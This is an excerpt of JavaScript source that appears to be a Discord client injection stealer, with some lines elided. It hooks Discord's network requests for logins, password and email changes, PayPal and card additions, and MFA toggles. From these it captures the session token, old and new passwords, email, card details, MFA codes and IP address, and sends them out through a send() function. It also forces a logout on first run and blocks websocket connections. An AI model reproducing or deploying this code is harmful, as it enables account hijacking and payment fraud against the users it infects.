    ...
    .then((i) => {
      switch (e) {
        ...
        case "paypal":
          send(
            "paypal",
            JSON.stringify({ token: n, injected: __dirname, ipAddress: i })
          );
          break;
        case "cardAdd":
          (s = JSON.parse(s)),
        ...
        case "injected":
          send(
            "inject",
            JSON.stringify({ injected: __dirname, token: n, ipAddress: i })
          );
      }
    });
}
...
function firstRun() {
  fs.readdirSync(__dirname).includes("ZeroTwo.txt") ||
    ...
    fs.writeFileSync(`${__dirname}/ZeroTwo.txt`, "i"),
    win.webContents.executeJavaScript(logOut, !0));
}
session.defaultSession.webRequest.onBeforeRequest(
  onLaunchingDiscord,
  (e, s) => {
    if (e.url.startsWith("wss://")) return s({ cancel: !0 });
    firstRun();
  }
),
  ...
  session.defaultSession.webRequest.onCompleted(onDiscordRequest, (e, s) => {
    if (e.url.endsWith("login") && 200 == e.statusCode && "POST" == e.method) {
      ...
      win.webContents
        ...
        .then((e) => organize("injected", null, null, e)),
        win.webContents
          .executeJavaScript(tken, !0)
    ...
    e.url.endsWith("users/@me") &&
      ...
      "PATCH" == e.method &&
      ((win = BrowserWindow.getAllWindows()[0]),
      (t = JSON.parse(e.uploadData[0].bytes)).new_password &&
        win.webContents
          .executeJavaScript(tken, !0)
          .then((e) => organize("passchange", t.password, t.new_password, e)),
      t.email &&
        win.webContents
          .executeJavaScript(tken, !0)
          .then((e) => organize("emailchange", t.email, t.password, e)));
    e.url.endsWith("billing-agreement-tokens") &&
      200 == e.statusCode &&
      "POST" == e.method &&
      BrowserWindow.getAllWindows()[0]
        .webContents.executeJavaScript(tken, !0)
        .then((e) => organize("paypal", null, null, e)),
      e.url.endsWith("/tokens") &&
        200 == e.statusCode &&
        "POST" == e.method &&
        BrowserWindow.getAllWindows()[0]
          .webContents.executeJavaScript(tken, !0)
          .then((s) =>
            organize(
              "cardAdd",
              JSON.stringify(parse(decodeURIComponent(e.uploadData[0].bytes))),
              null,
              s
            )
          ),
      e.url.endsWith("/enable") &&
        200 == e.statusCode &&
        "POST" == e.method &&
        BrowserWindow.getAllWindows()[0]
          .webContents.executeJavaScript(tken, !0)
          .then((s) => organize("mfaenable", e.uploadData[0].bytes, null, s)),
      e.url.endsWith("disable") &&
        200 == e.statusCode &&
        "POST" == e.method &&
        BrowserWindow.getAllWindows()[0]
          .webContents.executeJavaScript(tken, !0)
          .then((s) =>
            organize(
              "mfaDisable",
              JSON.parse(e.uploadData[0].bytes).code,
              null,
              s
            )
          );
